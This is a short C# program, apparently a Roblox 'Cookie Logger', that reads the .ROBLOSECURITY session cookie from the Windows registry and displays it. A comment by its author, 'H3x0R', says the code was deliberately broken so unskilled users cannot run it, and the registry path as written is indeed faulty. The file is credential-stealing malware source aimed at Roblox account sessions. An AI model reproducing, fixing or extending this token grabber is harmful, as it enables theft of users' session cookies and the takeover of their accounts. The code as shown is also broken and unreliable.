using System.Windows.Forms;
using Microsoft.Win32;

namespace Bruh
{
    class Program
    {
        // I obviously broke this code so skids can't use it; I'm not an idiot. - H3x0R
        static void Main()
        {
            RegistryKey DomainKey = Registry.CurrentUser.OpenSubKey(@"Computer\HKEY_CURRENT_USER\SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com");
            if (DomainKey == null)
                MessageBox.Show("Unable to grab key.", "Cookie Logger");
            else
                MessageBox.Show(DomainKey.GetValue(".ROBLOSECURITY", "Cookie Logger").ToString());
        }
    }
}
